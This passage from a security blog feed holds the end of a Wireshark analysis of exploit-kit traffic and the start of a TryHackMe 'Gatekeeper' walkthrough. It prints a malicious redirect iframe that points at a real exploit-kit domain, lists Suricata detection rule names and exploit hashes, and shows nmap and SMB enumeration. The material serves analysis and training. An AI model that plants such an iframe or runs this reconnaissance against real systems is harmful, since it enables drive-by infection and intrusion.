    &lt;p&gt;If we inspect the &lt;strong&gt;timeframe&lt;/strong&gt; after the web site was fully loaded, we’ll notice something is really strange …&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/1_5_ans.png&quot; title=&quot;ek1_ma/1_5_ans.png&quot; alt=&quot;ek1_ma/1_5_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Within &lt;strong&gt;&lt;em&gt;3 seconds&lt;/em&gt;&lt;/strong&gt;, the victim made two requests to &lt;strong&gt;other two different sites&lt;/strong&gt; respectively.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;If our theory is correct, there is some sort of redirection happening at the back end. Bearing that in mind, we should consider testing the theory in the impending investigations.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;6) What is the domain name of the compromised web site?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;37.200.69.143&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;7) What is the domain name that delivered the exploit kit and malware?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Answer: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stand.trustandprobaterealty.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain (Q6 &amp;amp; Q7)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;There were a large number of connection attempts against the domain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stand.trustandprobaterealty.com&lt;/code&gt; by the victim.&lt;/li&gt;
  &lt;li&gt;To view those connections, we filter traffics with the following search query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip.src==172.16.165.165 and http&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/1_6_ans.png&quot; title=&quot;ek1_ma/1_6_ans.png&quot; alt=&quot;ek1_ma/1_6_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Now that we assume EK was delivered by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stand.trustandprobaterealty.com&lt;/code&gt;, let’s us see more traffics between the malicious site and the victim.&lt;/li&gt;
  &lt;li&gt;The search query is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip.src==37.200.69.143 &amp;amp;&amp;amp; ip.dst==172.16.165.165 &amp;amp;&amp;amp; http&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/1_7_ans.png&quot; title=&quot;ek1_ma/1_7_ans.png&quot; alt=&quot;ek1_ma/1_7_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;The &lt;a href=&quot;https://mimeapplication.net/x-msdownload&quot;&gt;MIME&lt;/a&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-msdownload&lt;/code&gt; indicates an executable file is presented in the message.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;In order words, the victim was unknowingly downloading an executable from the domain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stand.trustandprobaterealty.com&lt;/code&gt; at that time.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;level-2&quot;&gt;&lt;strong&gt;Level 2&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;1) What is the redirect URL that points to the exploit kit (EK) landing page?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;24corp-shop.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Recalling the timeframe, we notice that the page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stand.trustandprobaterealty.com&lt;/code&gt; was loaded right after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;24corp-shop.com&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;We assume that there is a type of redirection that leads the victim to land on the EK page.&lt;/li&gt;
  &lt;li&gt;Let’s us further investigate the page source of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;24corp-shop.com&lt;/code&gt; domain.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;[1]. We navigate to: &lt;strong&gt;&lt;em&gt;File → Export Objects → HTTP&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;[2]. On the new window popped up, we save the file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.html&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/2_1_ans.png&quot; title=&quot;ek1_ma/2_1_ans.png&quot; alt=&quot;ek1_ma/2_1_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;[3]. Inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.html&lt;/code&gt; …&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...snip...]
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;bgcolor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#ffffff&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;center&apos;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;http://stand.trustandprobaterealty.com/?PHPSSESID=njrMNruDMhvJFIPGKuXDSKVbM07PThnJko2ahe6JVg|ZDJiZjZiZjI5Yzc5OTg3MzE1MzJkMmExN2M4NmJiOTM&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;125&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;scrolling=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt; 
[...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As expected, the litte &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iframe&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src&lt;/code&gt; tags refers to the EK site!.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;2) Besided the landing page (which contains the CVE-2013-2551 IE exploit), what other exploit(s) sent by the EK?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Flash&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;There were two other MIMEs performed by the EK web site: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-shockwave-flash&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/java-archive&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/2_2_ans.png&quot; title=&quot;ek1_ma/2_2_ans.png&quot; alt=&quot;ek1_ma/2_2_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;They respectively downloaded the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Adobe Flash&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt; files to the target system.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;3) How many times was the payload delivered?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Inspecting the following traffic, we can see that the payload with the same length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;401811&lt;/code&gt; is retransmitted three times.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/2_3_ans.png&quot; title=&quot;ek1_ma/2_3_ans.png&quot; alt=&quot;ek1_ma/2_3_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;5) Submit the pcap to VirusTotal and find out what snort alerts triggered.  What are the EK names are shown in the Suricata alerts?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;There are 6 alerts generated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;:
    &lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;1.&lt;/span&gt; Senstive Data
&lt;span class=&quot;p&quot;&gt;2.&lt;/span&gt; Potentially Bad Traffic
&lt;span class=&quot;p&quot;&gt;3.&lt;/span&gt; Attempted User Privilege Gain
&lt;span class=&quot;p&quot;&gt;4.&lt;/span&gt; A Network Trojan was detected
&lt;span class=&quot;p&quot;&gt;5.&lt;/span&gt; Potential Corporate Privacy Violation
&lt;span class=&quot;p&quot;&gt;6.&lt;/span&gt; Detection of a Denial of Service Attack 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;EK names are shown is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Suricata&lt;/code&gt; alerts:
    &lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;1.&lt;/span&gt; ET CURRENT_EVENTS Cool/BHEK/Goon Applet with Alpha-Numeric Encoded HTML entity [2017064]
&lt;span class=&quot;p&quot;&gt;2.&lt;/span&gt; ET CURRENT_EVENTS GoonEK encrypted binary (3) [2018297]
&lt;span class=&quot;p&quot;&gt;3.&lt;/span&gt; ET CURRENT_EVENTS Goon/Infinity URI Struct EK Landing May 05 2014 [2018441]
&lt;span class=&quot;p&quot;&gt;4.&lt;/span&gt; ET CURRENT_EVENTS RIG EK Landing URI Struct [2019072]
&lt;span class=&quot;p&quot;&gt;6.&lt;/span&gt; ET CURRENT_EVENTS RIG EK Landing Page Sept 17 2014 [2019193]
&lt;span class=&quot;p&quot;&gt;8.&lt;/span&gt; ET CURRENT_EVENTS RIG EK Landing March 20 2015 M2 [2020726]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;level-3&quot;&gt;&lt;strong&gt;Level 3&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;1) What file or page from the compromised website has the malicious script with the URL for the redirect?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.html&lt;/code&gt; of the compromised web site.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;On the search bar, we query: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp.stream eq 6&lt;/code&gt;, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow&lt;/code&gt; → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP Stream&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/3_1_ans.png&quot; title=&quot;ek1_ma/3_1_ans.png&quot; alt=&quot;ek1_ma/3_1_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Interestingly, a small script is embedded referred to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;24corp-shop.com&lt;/code&gt; site!.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;2) Extract the exploit file(s).  What is(are) the md5 file hash(es)?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Answer&lt;/strong&gt;:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Flash&lt;/code&gt; exploit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7b3baa7d6bb3720f369219789e38d6ab&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt; exploit: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1e34fdebbf655cebea78b45e43520ddf&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Explain&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;We can download those exploits by navigating to:
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;&lt;em&gt;File → Export Objects → HTTP&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ek1_ma/3_2_ans.png&quot; title=&quot;ek1_ma/3_2_ans.png&quot; alt=&quot;ek1_ma/3_2_ans.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Save&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Utilizing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5sum&lt;/code&gt; command of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*Unix&lt;/code&gt;, we can effectively extract MD5 hash of those file.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;flash  
7b3baa7d6bb3720f369219789e38d6ab  flash
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;java  
1e34fdebbf655cebea78b45e43520ddf  java
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Throughout the analysis procedures, we exposed the methodologies used by attackers.&lt;/li&gt;
  &lt;li&gt;While examining the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; communications, we also learned that EK could automatically mount multiple exploits against the victim web browser without their acknowledgement.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="wireshark" /><category term="blueteam" /><summary type="html">Introduction In this post, we’ll inspect malicious traffics with Wireshark. Furthermore, we deeply analyze how threat actors utilize Exploit Kit (EK) to mount multiple Client-Side exploitation attacks on the network.</summary></entry><entry><title type="html">Gatekeeper - THM</title><link href="https://jayngng.github.io/blog/gatekeeper-thm/" rel="alternate" type="text/html" title="Gatekeeper - THM" /><published>2021-09-11T22:50:17+10:00</published><updated>2021-09-11T22:50:17+10:00</updated><id>https://jayngng.github.io/blog/gatekeeper---thm</id><content type="html" xml:base="https://jayngng.github.io/blog/gatekeeper-thm/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Gatekeeper is vulnerable to &lt;strong&gt;Buffer Overflow&lt;/strong&gt; attack. We attain the initial access by exploiting the service running on port 31337. We can escalate our privilege via the &lt;strong&gt;outdated kernel version&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gatekeeper
| Issuer: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gatekeeper
| Public Key &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-09-10T01:15:41
| Not valid after:  2022-03-12T01:15:41
| MD5:   e039 9a3b 88e3 8e5f a23b 1461 cf5b e773
| SHA-1: 6b25 ec75 4f24 dc34 e7bd cfab b7dd 86e4 8bd7 4709
| &lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; CERTIFICATE-----
| MIIC2DCCAcCgAwIBAgIQcHjc5slJOatItgzWuUn67DANBgkqhkiG9w0BAQUFADAV
| MRMwEQYDVQQDEwpnYXRla2VlcGVyMB4XDTIxMDkxMDAxMTU0MVoXDTIyMDMxMjAx
| MTU0MVowFTETMBEGA1UEAxMKZ2F0ZWtlZXBlcjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAODxGA2YSZ/1tcbbsKE9qOE5V9W+Yj4rjYBZqhaR/jDqWR/t
| soqBl3OEMCwMQVivw+5PJwI9UcTu7wl3orTX+9g/fTbGQ40lVDfNp/uV3RIj2n1w
| yA7WYZFJszOSIKSOtVrLFbLJwjUK0AWpLhJuKNzXUBBtuqs6H0zNWSiuboscZMhg
| seujosPig3wN098b8KRPcc13GMnGcQiNLCXi+Srr8vc12Y+6cMOs+L/HM70/zsze
| 6ntEtjBMQvX/RBmseZ9Tk0OpfvTlyPoTw6ej0dDC8WAdPDHw/HJG2hvgnjLFKMnv
| Xn9T3ZSEhqy3sxxdEo7sK9vJv7RZ2d2fHz3RfG8CAwEAAaMkMCIwEwYDVR0lBAww
| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQCQqzFN
| S86cWXDJZ9tHh5G+COcFMDgEolg7TzEju43HQvGpgkbyNYgRdDb0Agfn56Fprs9o
| 0gYbK2JMv/LK8qM7Enswaa8LUuqX4OGBpwJRshCEWTU8EG4+KIUrG/TB5swDk/yB
| LdkXubTB80oV2JnnVr2MIW36tVtqJJ3ohLtuMNFjQdzgXQpn0xbyitc7gR/B5d9F
| eCgAG6JU1YevsRqfGPUcqWyPQlU7yZIWeKd8WSvIEcDbNNyOgo35Vz65khLc8xLr
| FeKmvwd0TQFt/NHvMxm7RGGmKmLSsTRqNDRIC19n2G07gTyjNWHFZzwWjKMuP9L6
| d3oboiSz7IIrqr/G
|_-----END CERTIFICATE-----
|_ssl-date: 2021-09-11T02:26:06+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.
31337/tcp open  Elite?             syn-ack ttl 125
| fingerprint-strings:
|   FourOhFourRequest:
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines:
|     Hello
|     Hello
|   GetRequest:
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions:
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help:
|     Hello HELP
|   Kerberos:
|     Hello &lt;span class=&quot;o&quot;&gt;!!!&lt;/span&gt;
|   LDAPSearchReq:
|     Hello 0
|     Hello
|   LPDString:
|     Hello
|     default!!!
|   RTSPRequest:
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions:
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;branch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;foo
|     Hello From: &amp;lt;sip:nm@nm&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root
|     Hello To: &amp;lt;sip:nm2@nm2&amp;gt;
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: &amp;lt;sip:nm@nm&amp;gt;
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|_    Hello
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are a few opening ports. Let’s us start with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; service.&lt;/p&gt;

&lt;h4 id=&quot;smb-enumeration&quot;&gt;&lt;strong&gt;SMB Enumeration&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;To list all the accessible file shares, we employ a utility called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot&lt;span class=&quot;s1&quot;&gt;&apos;s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
SMB1 disabled -- no workgroup available
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s us further investigate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Users&lt;/code&gt; share by droping an interactive shell.&lt;/p&gt;

&lt;p&gt;On the terminal, we execute&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Users
Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot&lt;span class=&quot;s1&quot;&gt;&apos;s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020
                  7863807 blocks of size 4096. 3876715 blocks available
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Share&lt;/code&gt; directory stands out interesting. To navigate to the directory, we simply run&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Share
smb: &lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;hare&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

                7863807 blocks of size 4096. 3876715 blocks available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

